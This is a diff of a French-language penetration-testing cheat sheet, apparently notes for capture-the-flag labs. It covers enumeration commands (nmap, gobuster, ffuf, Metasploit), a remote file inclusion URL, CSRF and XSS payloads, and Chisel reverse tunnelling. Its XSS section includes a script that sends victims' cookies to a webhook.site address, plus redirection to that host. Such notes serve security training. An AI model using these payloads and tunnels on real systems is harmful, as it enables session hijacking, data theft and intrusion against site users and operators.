@@ -39,9 +39,11 @@ nmap -p 31000-32000 -sV --open -v localhost | grep -E '^[0-9]+/tcp.*ssl/.*$'
 	
 
 # Web Enumeration
-#gobuster_cmd
 ```
 gobuster dir  -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://$ip/
+```
+```
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$ip/FUZZ
 ```
 ## par rapport au cms
 ```
@@ -51,16 +53,17 @@ $ find /usr/share/seclists/Discovery/Web-Content/ -type f -name *<cms_name>* 2>/
 ```
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://challenge01.root-me.org/web-serveur/ch11/
 ```
-##
+## scan website
 	| `enum4linux @IP` | scan website |
+## Grab website banner
+```
+curl -IL https://www.inlanefreight.com
+```
 
-	| `ffuf -w /usr/share/wordlists/dirb/big.txt -u http://thm/FUZZ` | same thing |
+	| `` | same thing |
 	| `dirsearch -u @HOST` | directory scan |
-	| `curl -IL https://www.inlanefreight.com` | Grab website banner |
+	| `` | Grab website banner |
 	| `whatweb 10.10.10.121` | List details about the webserver/certificates |
-	| `curl <address> -v` | View http header |
-	| `curl <address/sitemap.xml>` | vew directory referenced for search engine |
-	| `curl -X POST -d "param1=value1&param2=value2" https://example.com/api` | |
 ## backup files #backupFiles
 ### metasploit
 `msf6 > use auxiliary/scanner/http/backup_file`
@@ -72,7 +75,7 @@ Enfin on lance le scan :
 `msf6 auxiliary(scanner/http/backup_file) > run`
 # DNS Enumeration
 ```
-gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/namelist.txt
+gobuster dns -w /usr/share/seclists/Discovery/DNS/namelist.txt -d domain.com
 ```
 	| `host -t ns -p54011 adresse` | Display domain master and subdns |
 	| `dig -t ns @<address>` | same thing |
@@ -113,6 +116,9 @@ Rechercher un exploit sur l'application et les services hébergé
 ```
 curl -H "Content-type: application/json" --Cookie "<name>=<value>" -d '{"data":"data"}' -X POST http://domaine
 ```
+
+## Git
+git-dumper
 ## LFI 
 #Exploit_LFI/RFI
 LFI (Local File Inclusion) est une vulnérabilité de sécurité informatique qui permet à un attaquant d'inclure des fichiers locaux sur un serveur distant.
@@ -129,9 +135,9 @@ RFI (Remote File Inclusion) est une vulnérabilité de sécurité informatique s
 http://remote@IP/?page=//@ip_hacker/somefile
 ```
 
-# CSP
+## CSP
 #ExploitCSP[[CSP]]
-## Site de test CSP en ligne
+### Site de test CSP en ligne
 https://csp-evaluator.withgoogle.com/
 Google fournit une page Web de diagnostic (?) CSP appelée CSP Evaluator, et si vous la testez, elle vous informera des éléments CSP manquants. Il est normal de l'utiliser comme valeur de référence.
 ### Bypass script-src unsafe-inline
@@ -158,7 +164,7 @@ ce qui donne le payload
 ```
 
 ```
-# CSRF
+## CSRF
 #ExploitCSRF
 ```
 <img src= x onerror='document.location="?action=profile";document.getElementByName('username').value = "dine";document.forms[0].submit();'>
@@ -172,17 +178,15 @@ ce qui donne le payload
 <script>document.forms[0].submit()</script>
 ```
 
-# XSS
+## XSS
 #ExploitXSS
-## Insertion de script
+### Insertion de script
 ```
-<script>alert("Coucou !');</script>
+<script>alert("Coucou !");</script>
 ```
 ### Vole de cookie
 ```
-<script>
-document.write('<img src="[URL]?c='+document.cookie+'" />');
-</script>
+<script>document.write('<img src = "https://webhook.site/c7363cfa-6251-42b1-9cbf-4cbad321b1bb?' + 'cookie='+ document.cookie + '">');</script>
 ```
 ### Redirection automatique
 ```
@@ -201,16 +205,21 @@ Rend inutilisable la page générée ✗ L'utilisateur ne comprend pas la manipu
 ✗ Il attend que la victime s'authentifie sur le serveur. Si celui ci est mal programmé (exemple sessions J2EE), le cookie sera accepté. 
 ✗ L'attaquant possède alors un cookie de session authentifié valide qu'il peut utiliser en parallèle avec la victime
 
-## Insertion de tags HTML
-### En particulier de tags
+### Insertion de tags HTML
+#### En particulier le tags
 ```
-<img src="http://www.serveur.tld/image.jpg"/>
+<img src="https://webhook.site/da439638-ced7-48a8-9c0d-c0084e1d333a"/>
 ```
 ```
 <img src= x onerror(alerte(1))>
 ```
 
+#### redirection
+```
+<script>document.location="https://webhook.site/da439638-ced7-48a8-9c0d-c0084e1d333a"</script>
+```
 # foothold exploit
+
 ## Partage des ports de la cible sur ma machine
 On utilise *Chisel* https://github.com/jpillora/chisel/releases/tag/v1.9.1
 ### creation du serveur proxi sur ma machine
@@ -223,4 +232,3 @@ www-data@only4you:/tmp$
 ```
 ./chisel client 10.10.17.161:8000 R:127.0.0.1:3000 R:127.0.0.1:8001
 ```
-
